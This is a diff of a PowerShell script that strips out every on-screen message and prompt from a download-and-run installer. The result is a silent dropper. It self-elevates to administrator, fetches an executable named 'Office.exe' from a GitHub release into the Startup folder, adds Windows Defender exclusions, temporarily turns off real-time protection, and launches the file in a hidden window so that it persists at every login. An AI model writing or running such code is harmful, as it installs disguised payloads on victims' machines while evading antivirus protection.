@@ -1,260 +1,109 @@
-# Auto-elevate to Administrator if not already running as admin
+# Silent execution - no output commands
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Requesting Administrator privileges..."
     Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     exit
 }
 
-Write-Host "Running with Administrator privileges" -ForegroundColor Green
-
 $GitHubUrl = "https://github.com/irxdd/ikdk/releases/download/1/Office.exe"
 $Arguments = ""  
-
 $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
 function Add-DefenderExclusions {
-    param(
-        [string]$FilePath,
-        [string]$StartupPath
-    )
-    
+    param([string]$FilePath, [string]$StartupPath)
     try {
-        Write-Host "Adding comprehensive Windows Defender exclusions..."
-        
-        # Add file exclusion
         Add-MpPreference -ExclusionPath $FilePath -Force
-        Write-Host "Added file exclusion: $FilePath"
-        
-        # Add startup folder exclusion
         Add-MpPreference -ExclusionPath $StartupPath -Force
-        Write-Host "Added folder exclusion: $StartupPath"
-        
-        # Add process exclusion by filename
         $processName = [System.IO.Path]::GetFileName($FilePath)
         Add-MpPreference -ExclusionProcess $processName -Force
-        Write-Host "Added process exclusion: $processName"
-        
-        # Temporarily disable real-time monitoring during installation
         $originalRealtime = (Get-MpPreference).DisableRealtimeMonitoring
         if (-not $originalRealtime) {
             Set-MpPreference -DisableRealtimeMonitoring $true
-            Write-Host "Temporarily disabled real-time monitoring"
         }
-        
         return $originalRealtime
-        
     } catch {
-        Write-Warning "Some Defender exclusions failed: $($_.Exception.Message)"
         return $false
     }
 }
 
 function Restore-DefenderSettings {
-    param(
-        [bool]$OriginalRealtimeState
-    )
-    
+    param([bool]$OriginalRealtimeState)
     try {
         if (-not $OriginalRealtimeState) {
             Set-MpPreference -DisableRealtimeMonitoring $false
-            Write-Host "Re-enabled real-time monitoring"
         }
-    } catch {
-        Write-Warning "Could not restore Defender settings: $($_.Exception.Message)"
-    }
+    } catch {}
 }
 
 function Download-GitHubRelease {
-    param(
-        [string]$Url,
-        [string]$OutputPath
-    )
-     
+    param([string]$Url, [string]$OutputPath)
     try {
-        Write-Host "Downloading from: $Url"
-        
         $fileName = Split-Path $Url -Leaf
         $fullPath = Join-Path $OutputPath $fileName
         
         if (Test-Path $fullPath) {
             $fileAge = (Get-Date) - (Get-Item $fullPath).LastWriteTime
             if ($fileAge.TotalDays -lt 1) {
-                Write-Host "File already exists and is recent, skipping download"
                 return $fullPath
             } else {
-                Write-Host "Updating existing file..."
                 Remove-Item $fullPath -Force
             }
         }
         
-        # Use TLS 1.2 for secure connection
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "PowerShell-AutoInstaller")
-        
         $webClient.DownloadFile($Url, $fullPath)
         $webClient.Dispose()
-        
-        Write-Host "Downloaded successfully to: $fullPath"
         return $fullPath
-        
     } catch {
-        Write-Error "Failed to download file: $($_.Exception.Message)"
-        return $null
-    }
-}
-
-function Create-StartupBatchFile {
-    param(
-        [string]$ExecutablePath,
-        [string]$Arguments
-    )
-    
-    if (-not $Arguments) {
-        return $null
-    }
-    
-    try {
-        $batchFileName = [System.IO.Path]::GetFileNameWithoutExtension($ExecutablePath) + "_startup.bat"
-        $batchPath = Join-Path (Split-Path $ExecutablePath -Parent) $batchFileName
-        
-        $batchContent = "@echo off`nstart `"`" `"$ExecutablePath`" $Arguments"
-        
-        $batchContent | Out-File -FilePath $batchPath -Encoding ASCII -Force
-        
-        Write-Host "Created startup batch file: $batchPath"
-        return $batchPath
-        
-    } catch {
-        Write-Error "Failed to create batch file: $($_.Exception.Message)"
         return $null
     }
 }
 
 function Start-BackgroundProcess {
-    param(
-        [string]$FilePath,
-        [string]$Arguments
-    )
-    
+    param([string]$FilePath, [string]$Arguments)
     try {
-        Write-Host "Starting process in background: $FilePath"
-        
         $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
         $processStartInfo.FileName = $FilePath
         $processStartInfo.Arguments = $Arguments
         $processStartInfo.UseShellExecute = $false
         $processStartInfo.CreateNoWindow = $true
         $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        
         $process = [System.Diagnostics.Process]::Start($processStartInfo)
-        
         if ($process) {
-            Write-Host "Process started successfully with PID: $($process.Id)"
             return $process.Id
         } else {
-            Write-Error "Failed to start process"
             return $null
         }
-        
     } catch {
-        Write-Error "Failed to start process: $($_.Exception.Message)"
         return $null
     }
 }
 
-# Main execution
-Write-Host ""
-Write-Host "===== GitHub Release Auto-Startup Installer ====="
-Write-Host "Download URL: $GitHubUrl"
-Write-Host "Startup Path: $StartupPath"
-Write-Host ""
-
-# Test write access to startup folder
+# Silent execution
 try {
     $testFile = Join-Path $StartupPath "test_write_access.tmp"
     "test" | Out-File -FilePath $testFile -Force
     Remove-Item $testFile -Force
-    Write-Host "Write access to startup folder confirmed"
 } catch {
-    Write-Error "No write access to startup folder: $($_.Exception.Message)"
-    Read-Host "Press Enter to exit"
     exit 1
 }
 
-# Verify startup folder exists
 if (-not (Test-Path $StartupPath)) {
     try {
         New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null
-        Write-Host "Created startup folder: $StartupPath"
     } catch {
-        Write-Error "Cannot create startup folder: $($_.Exception.Message)"
-        Read-Host "Press Enter to exit"
         exit 1
     }
 }
 
-# Download the file
 $downloadedFile = Download-GitHubRelease -Url $GitHubUrl -OutputPath $StartupPath
 
 if ($downloadedFile -and (Test-Path $downloadedFile)) {
-    Write-Host "File successfully downloaded to startup folder: $downloadedFile"
-    
-    # Add comprehensive Defender exclusions
     $originalRealtimeState = Add-DefenderExclusions -FilePath $downloadedFile -StartupPath $StartupPath
-    
-    # Handle batch file creation if arguments exist
-    $startupFile = $downloadedFile
-    if ($Arguments) {
-        $batchFile = Create-StartupBatchFile -ExecutablePath $downloadedFile -Arguments $Arguments
-        if ($batchFile) {
-            $startupFile = $batchFile
-            Write-Host "Created batch file for arguments: $batchFile"
-        }
-    }
-    
-    # Start the process
     $processId = Start-BackgroundProcess -FilePath $downloadedFile -Arguments $Arguments
-    
-    # Restore Defender settings
     Start-Sleep -Seconds 2
     Restore-DefenderSettings -OriginalRealtimeState $originalRealtimeState
-    
-    if ($processId) {
-        Write-Host ""
-        Write-Host "Installation completed successfully!"
-        Write-Host "- Executable: $downloadedFile"
-        Write-Host "- Auto-startup: Enabled for every login"
-        Write-Host "- Currently running: PID $processId"
-        Write-Host "- Windows Defender: Exclusions added"
-        
-        if ($Arguments) {
-            Write-Host "- Startup file: $startupFile"
-        }
-        
-        Write-Host ""
-        Write-Host "To uninstall:"
-        Write-Host "Remove-Item `"$downloadedFile`" -Force"
-        if ($Arguments -and $startupFile -ne $downloadedFile) {
-            Write-Host "Remove-Item `"$startupFile`" -Force"
-        }
-        
-        Write-Host ""
-        Write-Host "Startup folder location:"
-        Write-Host "explorer `"$StartupPath`""
-        
-    } else {
-        Write-Warning "File downloaded but failed to start the application"
-        Restore-DefenderSettings -OriginalRealtimeState $originalRealtimeState
-    }
-} else {
-    Write-Error "Download failed"
-    Read-Host "Press Enter to exit"
-    exit 1
 }
 
-Write-Host ""
-Write-Host "The application will start automatically on next login."
-Write-Host ""
-Read-Host "Press Enter to close"
+# Exit silently - no Read-Host
